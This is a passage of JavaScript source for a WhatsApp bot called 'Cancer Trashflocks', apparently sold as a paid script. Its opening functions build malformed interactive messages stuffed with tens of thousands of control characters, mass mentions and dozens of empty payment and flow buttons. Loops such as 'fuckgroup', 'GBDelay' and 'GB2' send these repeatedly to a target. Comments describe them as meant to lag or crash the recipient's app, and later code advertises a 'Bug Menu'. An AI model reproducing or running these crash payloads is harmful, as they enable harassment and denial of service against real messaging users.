                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "♠️Cancer Trashflocks",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
//═══════════════════════════════════//
async function fuckgroup(target) {
  for (let i = 0; i < 20; i++) {
    const messageContent = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Fuck you",
              hasMediaAttachment: false
            },
            body: {
              text: "\u0003".repeat(9000), // Buat Delay, kalau ga suka ubh aj ke crash textnya ui
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0003" }, //kalau ga kedefiend getsu, del aja :/ + gw males :v
                { name: "payment_method", buttonParamsJson: "\u0003" },
                { name: "call_permission_request", buttonParamsJson: "\u0003", voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson: "\u0003" },
                { name: "wa_payment_learn_more", buttonParamsJson: "\u0003" },
                { name: "wa_payment_transaction_details", buttonParamsJson: "\u0003" },
                { name: "wa_payment_fbpin_reset", buttonParamsJson: "\u0003" },
                { name: "catalog_message", buttonParamsJson: "\u0003" },
                { name: "payment_info", buttonParamsJson: "\u0003" },
                { name: "review_order", buttonParamsJson: "\u0003" },
                { name: "send_location", buttonParamsJson: "\u0003" },
                { name: "payments_care_csat", buttonParamsJson: "\u0003" },
                { name: "view_product", buttonParamsJson: "\u0003" },
                { name: "payment_settings", buttonParamsJson: "\u0003" },
                { name: "address_message", buttonParamsJson: "\u0003" },
                { name: "automated_greeting_message_view_catalog", buttonParamsJson: "\u0003" },
                { name: "open_webview", buttonParamsJson: "\u0003" },
                { name: "message_with_link_status", buttonParamsJson: "\u0003" },
                { name: "payment_status", buttonParamsJson: "\u0003" },
                { name: "galaxy_costum", buttonParamsJson: "\u0003" },
                { name: "extensions_message_v2", buttonParamsJson: "\u0003" },
                { name: "landline_call", buttonParamsJson: "\u0003" },
                { name: "mpm", buttonParamsJson: "\u0003" },
                { name: "cta_copy", buttonParamsJson: "\u0003" },
                { name: "cta_url", buttonParamsJson: "\u0003" },
                { name: "review_and_pay", buttonParamsJson: "\u0003" },
                { name: "galaxy_message", buttonParamsJson: "\u0003" },
                { name: "cta_call", buttonParamsJson: "\u0003" }
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, messageContent.message, {
      messageId: messageContent.key.id
    });

    console.log(chalk.red(`Sukses kirim BugViewOnce ke ${target}`));
  }
}
//═══════════════════════════════════//

//═══════════════════════════════════//
async function GBDelay(target) {
  for(let y = 0; y < 100; y++) {
    await PouDelayInvis2(target);
    await sleep(1000)
    await poubakdelay(target);
  }
}
//═══════════════════════════════════//
async function GB2(target) {
  for(let y = 0; y < 20; y++) {
    await groupNullInv(target, mention = true);
    await sleep(1000)
    await BugGb12(target);
  }
}
//═══════════════════════════════════//
//END
    // List Khodam
    const listKhodam = [
        "Nyi Roro Kidul", "Genderuwo Merah", "Macan Putih",
        "Siluman Ular", "Kuyang", "Tuyul Sultan", "Monyet Hitam",
        "Raksasa Penjaga Gerbang", "Harimau Belang", "Naga Emas",
        "Buto Ijo", "Kuntilanak Putih", "Elang Hitam", "Serigala Bumi",
        'Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 
        'Badak Jawa', 'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel',
        'Kuyang', 'Lembuswana', 'Anoa', 'Komodo', 'Elang Jawa', 
        'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 'Sundel Bolong', 
        'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 
        'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 
        'Banteng Jawa', 'Monyet Ekor Panjang', 'Tarsius', 
        'Cenderawasih Biru', 'Setan Merah', 'Kolor Ijo', 'Palasik', 
        'Kelabang', 'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 
        'Lutung Kasarung', 'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 
        'Kambing Etawa', 'Kelelawar', 'Burung Hantu', 'Ikan Cupang'
    ];
    
    // List Ganteng Random
    const listGanteng = [
        "Ganteng Natural",
        "Ganteng Tapi Buaya",
        "Ganteng Tapi Bucin",
        "Ganteng Mirip Anime",
        "Ganteng Limited Edtion",
        "Ganteng Kaya Satria Baja Hitam",
        "Ganteng Tapi Pasaran",
        "Ganteng + Softboy",
        "Ganteng Mafia",
        "Ganteng Idaman",
        "Ganteng Reborn",
        "Ganteng Banget Bangsat Anak Siapa Nih? Gada Yang Gak Mau Ama Nih Orang🤭🤭🤭", 
        "Ganteng Banget Jir, Impian Chindo Fineshyt Inimah🤭", 
        "Lumayan Ganteng, Pasti Badutnya Dia😹😛"
    ];
    //═══════════════════════════════════//
    
    //═══════════════════════════════════//
    const Pewe = [
    "1",
    "2", 
    "3", 
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",];
    const pwR = Pewe[Math.floor(Math.random() * Pewe.length)];
    const Moji1 = '🤢'
    const Moji2 = '🤮'
    const Moji3 = '😹'
    const Moji4 = '🐽'
    const Moji5 = '🚪'
    const ERandom = [Moji1, Moji2, Moji3, Moji4, Moji5]
    let Feature = Math.floor(Math.random() * ERandom.length)
    const emoji = ERandom[Feature]
    //═══════════════════════════════════//
    async function getRandomThumb() {
        let thumbs = [
            global.thumb, global.thumb2, global.thumb3, global.thumb4
        ]
        return thumbs[Math.floor(Math.random() * thumbs.length)]
    }
    let thumbnya = getRandomThumb()
    //═══════════════════════════════════//
    const qlocPay = {
        key: {
            remoteJid: 'status@broadcast',
            fromMe: false,
            id: `${global.botname}`,
            participant: '0@s.whatsapp.net'
        },
        message: {
            requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: 3500000,
                requestFrom: '0@s.whatsapp.net',
                noteMessage: {
                    extendedTextMessage: {
                      text: `${global.botname}`
                    }
                },
                expiryTimestamp: 999999999,
                amount: {
                    value: 91929291929,
                    offset: 1000,
                    currencyCode: "INR"
                }
            }
        }
    }
    //═══════════════════════════════════//
    const contactQ = {
        "key": {
            "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
            "fromMe": false,
            "id": "Halo"
        },
        "message": {
            "locationMessage": {
                "name": `${global.botname}\n`,
                "jpegThumbnail": ''
            }
        }
    }
    //═══════════════════════════════════//
    // Ambil nama user & nomor
    let namaUser = m.pushName || "Tak Kenal";
    let number = m.sender.replace(/@.+/, "");
    
    const statsQ = {
        key: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: false
        },
        message: {
            contactMessage: {
                displayName: namaUser,
                vcard:
    `BEGIN:VCARD
    VERSION:3.0
    FN:${namaUser}
    X-WA-BIZ-NAME:${namaUser}
    ORG:${namaUser}
    TEL;type=CELL;type=VOICE;waid=${number}:${number}
    END:VCARD`,
            }
        }
    };
    
    /*const statsQz = {
        let namaUser = m.pushName;
        key: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: false
        },
        message: {
            contactMessage: {
            displayName: namaUser, 
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${namaUser}\nX-WA-BIZ-NAME:Itss Dric\nORG:${namaUser}\nTEL;type=CELL;type=VOICE;waid=821042944776:+8210-4294-47762\nEND:VCARD`
            }
        }
    }*/
    //═══════════════════════════════════//
    const lampuwarna = {
        key: {
            participant: `0@s.whatsapp.net`,
            ...(m.chat ? {
            remoteJid: "status@broadcast"
            } : {})
        },
        message: {
            listResponseMessage: {
                title: `${global.dev}`
            }
        }
    }
    //═══════════════════════════════════//
    const soundnyaa = { 
        key: {
            fromMe: false, 
            participant: `itssdric@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
        },
        "message": {
            "audioMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
            "mimetype": "audio/mp4",
            "fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
            "fileLength": "1067401",
            "seconds": 17021999,
            "ptt": true,
            "mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
            "fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
            "directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
            "mediaKeyTimestamp": Math.floor(Date.now() / 1000)
            }
        }
    }
    //═══════════════════════════════════//
    const hw = {
      key: {
        participant: '18002428478@s.whatsapp.net', 
        ...(m.chat ? {remoteJid: `status@broadcast`} : {})
      }, 
      message: {
        liveLocationMessage: {
          caption: `⌬ Cancer Trashflocks ⌬`,
          jpegThumbnail: ""
        }
      }, 
    quoted: soundnyaa
    } 
    //═══════════════════════════════════//
    const reaction = async (jidss, emoji) => {
        sock.sendMessage(jidss, {
            react: {
                text: emoji,
                key: m.key 
            } 
        })
    };
    //═══════════════════════════════════//
    const Reply = async (teks) => {
        return sock.sendMessage(m.chat, {
            interactiveMessage: {
                header: "",
                title: teks,
                jpegThumbnail: fs.readFileSync("./lib/Image/thumb.jpg"),
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 99999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterName: global.namaSaluran,
                        newsletterJid: global.idSaluran,
                        serverId: 200
                    }
                },
                externalAdReply: {
                    title: `© ${global.botname}`,
                    body: `Script Version: ${global.global.version}`,
                    thumbnailUrl: global.thumb, 
                    renderLargerThumbnail: false, 
                    mediaType: 1, 
                    previewType: 1, 
                    sourceUrl: global.linkSaluran, 
                },
                buttons: [
                    {
                        name: "galaxy_message",
                        buttonParamsJson: "{\"flow_message_version\":\"3\",\"flow_token\":\"unused\",\"flow_id\":\"1775342589999842\",\"flow_cta\":\" \",\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"AWARD_CLAIM\",\"data\":{\"error_types\":[],\"campaigns\":[],\"categories\":[{\"id\":\"category_1\",\"title\":\"Unicam\"},{\"id\":\"category_2\",\"title\":\"Constantes\"},{\"id\":\"category_3\",\"title\":\"Referidos\",\"on-unselect-action\":{\"name\":\"update_data\",\"payload\":{\"subcategory_visibility\":false}},\"on-select-action\":{\"name\":\"update_data\",\"payload\":{\"subcategories\":[{\"id\":\"1\",\"title\":\"1 subcategory\"},{\"id\":\"2\",\"title\":\"2 subcategory\"}],\"subcategory_visibility\":true}}}],\"subcategory_visibility\":false}},\"flow_metadata\":{\"flow_json_version\":1000,\"data_api_protocol\":\"I'm dying and bleeding of my past\",\"data_api_version\":9999999,\"flow_name\":\" \",\"categories\":[]},\"icon\":\"REVIEW\",\"has_multiple_buttons\":true}"
                    }
                ]
            }
        }, { quoted: contactQ });
    }
    //═══════════════════════════════════//
    const Intronya =
`✦ *${global.botname}*
› ${ucapanWaktu}, *${pushname}*

◈ *Developer*  : Itss Dric
◈ *Versi*       : 9.9.9
◈ *Mode*        : ${sock.public ? "Public" : "Self"}
◈ *Status*      : ${isOwner ? "Owner" : isPremium ? "Premium" : "Free"}
◈ *Runtime*    : ${RunTime}
◈ *Features*   : ${totalFitur()} Fitur

⌬ ${global.footer}`;

    // Fungsi buat nampilin menu sesuai pilihan
    async function showMenu(menuSetting, pushname, ucapanWaktu, m) {
        if (global.menuSetting === "docu") {
            sock.sendMessage(m.chat, {
                document: fs.readFileSync("./package.json"),
                fileName: `— ${global.dev}`,
                mimetype: "application/pdf",
                fileLength: 9999999999,
                pageCount: 666,
                caption: `${Intronya}\n`,
                footer: `${global.FavFiturr}\n${global.footer}`,
                buttons: [
                    { buttonId: `${prefix}sc`, buttonText: { displayText: 'Buy Script' }, type: 1 }
                ],
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    mentionedJid: [sender],
                    forwardedNewsletterMessageInfo: {
                        newsletterName: global.namaSaluran,
                        newsletterJid: global.idSaluran,
                    },
                    externalAdReply: {  
                        title: `${global.dev} — Assistant`, 
                        body: global.botname,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran, 
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: contactQ })
        } else if (global.menuSetting === "button") {
            sock.sendMessage(m.chat, {
                productMessage: {
                    title: `${Intronya}\n`,
                    description: `𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆 ${global.dev}`,
                    thumbnail: { url: global.thumb },
                    productId: "Prod2311",
                    retailerId: "RETAIL2311",
                    url: "https://t.me/xnnxdxc",
                    body: "",
                    footer: `${global.FavFiturr}\n\n© ${global.botname}`,
                    priceAmount1000: 35000000,
                    currencyCode: "IDR",
                    buttons: [
                        {
                            buttonId: 'action',
                            buttonText: { displayText: 'Click Here' },
                            type: 4,
                            nativeFlowInfo: {
                                name: 'single_select',
                                paramsJson: JSON.stringify({
                                    title: `Select Buttons`,
                                    sections: [
                                        {
                                            title: `—Full Feature`,
                                            highlight_label: `By ${global.dev}`,
                                            rows: [
                                                { 
                                                title: "⎋ All Feature", 
                                                description: `${global.footer}`, 
                                                id: `${prefix}start2` 
                                                }
                                            ]
                                        },
                                        {
                                        title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                                        highlight_label: `By ${global.dev}`,
                                        rows: [
                                            {
                                                title: "⎋ Bug Feature",
                                                description: `${global.footer}`,
                                                id: ".bugmenu"
                                            },
                                            {
                                                title: "⎋ Owner Feature",
                                                description: `${global.footer}`,
                                                id: ".ownmenu"
                                            },
                                            {
                                                title: "⎋ Install Feature",
                                                description: `${global.footer}`,
                                                id: ".instalmenu"
                                            },
                                            {
                                                title: "⎋ Panel Feature",
                                                description: `${global.footer}`,
                                                id: ".panelmenu"
                                            },
                                            {
                                                title: "⎋ Group Feature",
                                                description: `${global.footer}`,
                                                id: ".grupmenu"
                                            },
                                            {
                                                title: "⎋ Payment Feature",
                                                description: `${global.footer}`,
                                                id: ".paymenu"
                                            },
                                            {
                                              title: "⎋ Games Feature",
                                              description: `${global.footer}`,
                                              id: ".gamemenu"
                                            },
                                            {
                                                title: "⎋ Maker Feature",
                                                description: `${global.footer}`,
                                                id: ".makermenu"
                                            },
                                            {
                                                title: "⎋ Other Feature",
                                                description: `${global.footer}`,
                                                id: ".othermenu"
                                            }          
                                        ]},
                                        {
                                            title: `—For Information`,
                                            highlight_label: `By ${global.dev}`,
                                            rows: [
                                                { title: "⎋ Credits", 
                                                description: `${global.footer}`, 
                                                id: `${prefix}tqto` }
                                            ]
                                        },
                                    ]
                                })
                            },
                            viewOnce: true
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Whatsapp Creator",
                                url: `https://${global.nowa}`
                            })
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: "Channel Information",
                                url: `${global.linkSaluran}`
                            })
                        },
                    ]
                }
            }, { quoted: contactQ });
        } else if (global.menuSetting === "buttonNew") {
            sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `⌬ ${global.footer}`,
                    thumbnail: global.thumb,
                    mentions: [m.sender],
                    contextInfo: {
                        mentionedJid: [m.sender],
                        isForwarded: true,
                        forwardingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: global.botname,
                                url: global.tgram,
                                copy_code: "CancerTrashflocks",
                                expiration_time: Date.now() * 999
                            },
                            bottom_sheet: {
                                in_thread_buttons_limit: 3,
                                divider_indices: [2, 5, 8],
                                list_title: `${global.botname}`,
                                button_title: "Pilih Menu"
                            },
                            tap_target_configuration: {
                                title: "◈ Menu",
                                description: `${global.botname}`,
                                canonical_url: `${global.tgram}`,
                                domain: "itssdric.web.id",
                                button_index: 0
                            }
                        }),
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⚔️ Bug Menu",
                                    id: `${prefix}bugmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Owner Menu",
                                    id: `${prefix}ownmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🛡️ Group Menu",
                                    id: `${prefix}grupmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🖥️ Panel Menu",
                                    id: `${prefix}panelmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🔧 Install Menu",
                                    id: `${prefix}instalmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🎮 Games Menu",
                                    id: `${prefix}gamemenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "💳 Payment",
                                    id: `${prefix}paymenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "🎨 Maker Menu",
                                    id: `${prefix}makermenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "📦 Other Menu",
                                    id: `${prefix}othermenu`
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "WhatsApp Dev",
                                    url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Telegram Dev",
                                    url: `https://${global.tele}`
                                })
                            }
                        ]
                    }
                }
            }, { quoted: contactQ });
        } else if (global.menuSetting === "gif") {
            sock.sendMessage(m.chat, {
                video: { url: global.mp4 },
                gifPlayback: true,
                caption: `${Intronya}`,
                footer: `${global.FavFiturr}\n${global.footer}`,
                mentions: [m.sender],
                contextInfo: {
                    mentionedJid:[sender],
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran, 
                        serverId: 200
                    }, 
                    externalAdReply: {
                        title: `© ${global.botname}`,
                        body: `Script Version: ${global.global.version}`,
                        thumbnailUrl: global.thumb, 
                        renderLargerThumbnail: false, 
                        mediaType: 1, 
                        previewType: 1, 
                        sourceUrl: global.linkSaluran, 
                    }
                }
            }, { quoted: contactQ });
        }
    }
    //END
    //═══════════════════════════════════//
    const rDone = (teks) => {
      return sock.sendMessage(m.chat, {
        interactiveMessage: {
          title: teks,
          footer: global.footer,
          thumbnail: global.thumb,
          contextInfo: {
            mentionedJid: [m.sender], 
            isForwarded: true, 
            forwardingScore: 250930,
            forwardedNewsletterMessageInfo: {
              newsletterJid: global.idSaluran,
              newsletterName: global.namaSaluran,
              serverId: 999
            },
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "Itss Dric",
                url: `${global.tgram}`,
                copy_code: global.dev,
                expiration_time: Date.now() * 999
              },
              bottom_sheet: {
                in_thread_buttons_limit: 2,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "Cancer Trashflocks By Itss Dric",
                button_title: "Select Ur Button"
              }
            }),
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Telegram Creator",
                  url: `${global.tgram}`
                })
              }
            ]
          }
        }
      },
      { quoted: contactQ });
    }
    //═══════════════════════════════════//
    let groupCache = {}; // Simpan Data Grup
        
        const getGroupName = async (m) => {
            if (!isGroup) return "Private Chat";
        
            // Gunakan Cache jika tersedia
            if (groupCache[m.chat]) {
                return groupCache[m.chat].subject;
            }
        
            // Ambil Metadata Grup
            const metadata = await sock.groupMetadata(m.chat).catch(() => null);
            if (metadata) {
                groupCache[m.chat] = metadata; // Simpan ke Cache
            }
        
            return metadata && metadata.subject ? metadata.subject : "Nama Grup Tidak Diketahui";
        };
        const groupName2 = await getGroupName(m);
    //===================================
    if (m.message) {
        const safe = (v) => {
            if (v === undefined || v === null) return "";
            if (typeof v === "boolean") return "";
            return String(v);
        };
    
        const msgType = m.mtype || "Unknown";
        const isCmd = body?.startsWith(prefix) ? body.split(" ")[0] : "";
        const pureText = (!isCmd ? safe(body) : safe(body.replace(isCmd, "").trim()));
    
        const mediaType =
            msgType === "imageMessage" ? "Image" :
            msgType === "videoMessage" ? "Video" :
            msgType === "audioMessage" ? "Audio" :
            msgType === "stickerMessage" ? "Sticker" :
            msgType === "documentMessage" ? "Document" :
            msgType === "extendedTextMessage" ? "Text" :
            msgType === "conversation" ? "Text" :
            msgType === "buttonsResponseMessage" ? "Button Click" :
            msgType === "listResponseMessage" ? "List Response" :
            msgType === "templateButtonReplyMessage" ? "Template Button" :
            msgType;
    
        let quotedType = "";
        if (m.quoted && m.quoted.mtype) {
            quotedType =
                m.quoted.mtype === "imageMessage" ? "Image" :
                m.quoted.mtype === "videoMessage" ? "Video" :
                m.quoted.mtype === "stickerMessage" ? "Sticker" :
                m.quoted.mtype === "audioMessage" ? "Audio" :
                m.quoted.mtype === "conversation" ? "Text" :
                m.quoted.mtype;
        }
    
        console.log(chalk.red.bold("\n(====> NEW MESSAGE <====)"));
        console.log(`${chalk.hex("#FFD700")("📅   Tanggal:")} ${chalk.hex("#00FFFF")(`[${todayDateWIB}]`)}`);
        console.log(`${chalk.hex("#FFD700")("🕒   Waktu:")} ${chalk.hex("#00FFFF")(`[${time}]`)}`);
    
        console.log(`${chalk.hex("#FFA500")("💌   Dari:")} ${chalk.hex("#FF69B4")(`${m.pushName} (${m.sender})`)}`);
        console.log(`${chalk.hex("#FFA500")("📍   Di:")} ${chalk.hex("#FF69B4")(`${groupName2 || "Private Chat"}`)}`);
    
        if (isCmd) {
            console.log(`${chalk.hex("#00FF00")("💬   Command:")} ${chalk.hex("#FFFFFF")(isCmd)}`);
        }
    
        if (pureText) {
            console.log(`${chalk.hex("#00FF00")("📝   Pesan:")} ${chalk.hex("#FFFFFF")(pureText)}`);
        } else {
            console.log(`${chalk.hex("#00FF00")("📝   Pesan:")} ${chalk.hex("#FFFFFF")(mediaType)}`);
        }
    
        if (quotedType) {
            console.log(`${chalk.hex("#00FFFF")("↩️   Quoted:")} ${chalk.hex("#FFFFFF")(quotedType)}`);
        }
    
        console.log(""); // empty line biar rapih
    }
    //============================================//
    async function loading() {
          var Floading = [
              "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
              "《 ████▒▒▒▒▒▒▒▒》30%",
              "《 ███████▒▒▒▒▒》50%",
              "《 ██████████▒▒》80%",
              "《 ████████████》100%",
              `${global.footer} System ON...`
          ]
          let { key } = await sock.sendMessage(from, {
              text: "ʟᴏᴀᴅɪɴɢ..."})
          for (let i = 0; i < Floading.length; i++) {
              await sock.sendMessage(from, {
                  text: Floading[i], 
                  edit: key 
              });
              await sleep(1500)
          }
    }
    //═══════════════════════════════════//
    switch (command) {
        case 'menu': case 'start': {
            await reaction(m.chat, "🔇")
            await sleep(1000)
            await reaction(m.chat, "🔉")
            await sleep(1000)
            await reaction(m.chat, "🔊")
            await sleep(1000)
            await showMenu(global.menuSetting, pushname,  ucapanWaktu, m)
            await sleep(3000)
            sock.sendMessage(m.chat, {
                audio: { url: Silver },
                mimetype: 'audio/mp4',
                ptt: true
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case 'cancer': {
            await reaction(m.chat, "🔇")
            await sleep(1000)
            await reaction(m.chat, "🔉")
            await sleep(1000)
            await reaction(m.chat, "🔊")
            await sleep(1000)
            await loading()
            await sleep(1000)
            await showMenu(global.menuSetting, pushname,  ucapanWaktu, m)
            await sleep(3000)
            sock.sendMessage(m.chat, {
                audio: { url: Silver },
                mimetype: 'audio/mp4',
                ptt: true
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case "settodocu": {
          if (!isOwner) return reply(msg.owner);
          global.menuSetting = "docu"
          reply(`\`[ # ]\` *Menu set to Document*`)
        }
        break
        //═══════════════════════════════════//
        case "settobutton": {
          if (!isOwner) return reply(msg.owner);
          global.menuSetting = "button"
          reply(`\`[ # ]\` *Menu set to Simple Button*`)
        }
        break
        //═══════════════════════════════════//
        case "settobutton2": case 'settobuttonnew': {
          if (!isOwner) return reply(msg.owner);
          global.menuSetting = "buttonNew"
          reply(`\`[ # ]\` *Menu set to Complex Button*`)
        }
        break; 
        //═══════════════════════════════════//
        case "settogif": {
          if (!isOwner) return reply(msg.owner);
          global.menuSetting = "gif"
          reply(`\`[ # ]\` *Menu set to Gif Video*`)
          break
        }
        //═══════════════════════════════════//
        case "setmenu": case 'settmenu': {
            if (!isOwner) return reply(msg.owner);
            
            const quantumBtns = [
                 {
                      buttonId: 'action',
                      buttonText: { displayText: 'Options' },
                      type: 4,
                      nativeFlowInfo: {
                          name: 'single_select',
                          paramsJson: JSON.stringify({
                              title: "Select The Button Below!",
                              sections: [
                                  {
                                      title: `⬨ ${global.name} — Selection`,
                                      highlight_label: "Best",
                                      rows: [
                                          {
                                              header: "⌯ Complex Button",
                                              title: "!Change Menu Display to Complex Button",
                                              description: `© ${global.botname}`,
                                              id: ".settobutton2"
                                          },
                                          {
                                              header: "⌯ Simple Button",
                                              title: "!Change Menu Display to Button",
                                              description: `© ${global.botname}`,
                                              id: ".settobutton"
                                          },
                                          {
                                              header: "⌯ Document",
                                              title: "!Change Menu Display to Document",
                                              description: `© ${global.botname}`,
                                              id: ".settodocu"
                                          },
                                          {
                                              header: "⌯ Gif Video",
                                              title: "!Change Menu Display to Gif Video",
                                              description: `© ${global.botname}`,
                                              id: ".settogif"
                                          }
                                      ]
                                  }
                              ]
                          })
                      },
                      viewOnce: true
                 }
            ]
            
            const nebulaMsg = {
                image: { url: global.thumb },
                caption: "⸙ Select Type Message Menu",
                footer: `${global.footer}`,
                buttons: [
                    ...quantumBtns,
                    { buttonId: '.menu', buttonText: { displayText: 'Back' }, type: 1 },
                    { buttonId: '.mode', buttonText: { displayText: 'Mode' }, type: 1 }
                ],
                headerType: 4,
                viewOnce: true
            };
            
            return await sock.sendMessage(m.chat, nebulaMsg, { quoted: contactQ })
        }
        break
        //═══════════════════════════════════//
        case 'allmenu':
        case 'start2': 
        case 'maklu': {
  
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.AllMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        }
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}sc`
                                })
                            }
                        ]
                    }
                }
            }, { quoted: contactQ });
        }
        break
        //════════════════════════════════//
        case 'ownermenu': case 'ownmenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.OwnerMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Whatsapp Creator",
                                    url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Credit",
                                    id: `${prefix}tqto`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Buy Script",
                                    id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            }, { quoted: contactQ });
        }
        break
        //═══════════════════════════════//
        case 'bugmenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.BugMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        }
                    },
                    nativeFlowMessage: {
